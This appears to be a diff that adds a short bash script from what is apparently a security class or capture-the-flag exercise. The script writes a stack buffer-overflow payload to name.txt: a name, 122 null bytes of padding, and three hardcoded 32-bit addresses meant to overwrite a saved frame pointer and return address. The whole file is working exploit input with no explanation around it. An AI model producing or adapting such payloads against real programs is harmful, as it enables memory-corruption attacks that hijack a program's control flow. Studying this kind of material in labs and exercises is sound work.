@@ -1,0 +1,3 @@
+#!/bin/bash
+
+python -c 'print "Wright Kim" + "\x00"*122 +"\xf8\xef\xff\xbf"+ "\x0e\x85\x04\x08"+ "\x40\xa0\x04\x08"'>>name.txt
